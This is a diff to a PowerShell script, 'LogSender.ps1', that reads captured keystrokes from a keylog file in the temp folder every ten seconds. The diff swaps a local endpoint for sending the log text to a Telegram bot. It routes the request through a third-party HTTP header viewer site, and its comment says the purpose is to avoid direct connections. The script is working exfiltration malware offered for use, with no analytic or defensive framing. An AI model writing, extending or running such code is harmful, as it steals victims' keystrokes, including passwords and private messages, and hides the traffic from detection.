@@ -1,6 +1,5 @@
 # Fixed LogSender.ps1
 $logFile = "$env:temp\keylog.txt"
-$serverBaseUrl = "http://localhost:5000/receive_text"
 $lastContent = ""
 $firstRun = $true
 
@@ -14,15 +13,18 @@ function Send-LogContent {
             # Trim the content to reasonable length and clean it
             $cleanContent = $content.Trim() -replace "[^\p{L}\p{N}\p{P}\p{S}\s]", ""
             
-            # Build URI safely
-            $uriBuilder = New-Object System.UriBuilder $serverBaseUrl
-            $uriBuilder.Query = "text=$([System.Uri]::EscapeDataString($cleanContent))"
-            $fullUrl = $uriBuilder.ToString()
+            # Prepare Telegram API URL with escaped content
+            $telegramUrl = "https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={admin_chat_id}&text=$([System.Uri]::EscapeDataString($cleanContent))"
             
-            # Send GET request with timeout
-            $response = Invoke-RestMethod -Uri $fullUrl -Method Get -TimeoutSec 5
+            # Send through HTTP Debugger to avoid direct connections
+            $response = Invoke-WebRequest -Uri "https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx" -Method Post -Body @{
+                "UrlBox" = $telegramUrl
+                "AgentList" = "Mozilla Firefox"
+                "VersionsList" = "HTTP/1.1"
+                "MethodList" = "POST"
+            } -ContentType "application/x-www-form-urlencoded" -TimeoutSec 5
             
-            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Logs sent successfully ($($cleanContent.Length) chars)"
+            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Logs sent to Telegram ($($cleanContent.Length) chars)"
             return $true
         }
         catch {
@@ -34,7 +36,7 @@ function Send-LogContent {
 
 Write-Host "Starting log sender. Press Ctrl+C to stop."
 Write-Host "Monitoring file: $logFile"
-Write-Host "Sending to: $serverBaseUrl"
+Write-Host "Sending logs to Telegram"
 
 # Main loop
 while ($true) {
@@ -61,4 +63,3 @@ while ($true) {
     
     # Wait 10 seconds before checking again
     Start-Sleep -Seconds 10
-}
